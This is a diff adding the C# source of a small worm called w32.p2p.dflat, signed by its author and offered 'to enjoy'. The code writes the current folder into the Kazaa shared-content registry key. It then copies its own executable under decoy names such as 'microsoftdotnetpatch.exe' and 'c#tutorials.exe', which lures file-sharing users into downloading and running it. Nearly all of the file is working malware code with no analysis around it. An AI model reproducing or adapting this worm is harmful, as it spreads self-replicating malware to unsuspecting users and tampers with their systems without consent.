@@ -1,0 +1,36 @@
+   /*================
+   w32.p2p.dflat
+   ================
+
+   dotnet program affected with the p2p craze.... the first c# proggie doin some kazaa spreading..
+
+   enjoy,
+
+   alcopaul
+   */
+
+
+   using System.IO;
+   using System.Reflection;
+   using Microsoft.Win32;
+
+   class p2pdotnet
+   {
+   public static void Main()
+   {
+   RegistryKey rk = Registry.CurrentUser.OpenSubKey("Software\\Kazaa\\LocalContent", true);
+   rk.SetValue("Dir0", "012345:" + Directory.GetCurrentDirectory());
+   Module self = Assembly.GetExecutingAssembly().GetModules()[0];
+   string[] filenames = new string[] {"dotnethack.exe", "xboxdotnetemulator.exe", "linuxdotnet.exe", "dosdotnet.exe", "microsoftdotnetpatch.exe", "sha1.exe", "tripleDES.exe", "c#tutorials.exe"};
+   foreach (string names in filenames) {
+   try
+   {
+   File.Copy(self.FullyQualifiedName, names);
+   }
+   catch
+   {
+   continue;
+   }
+   }
+   }
+   }
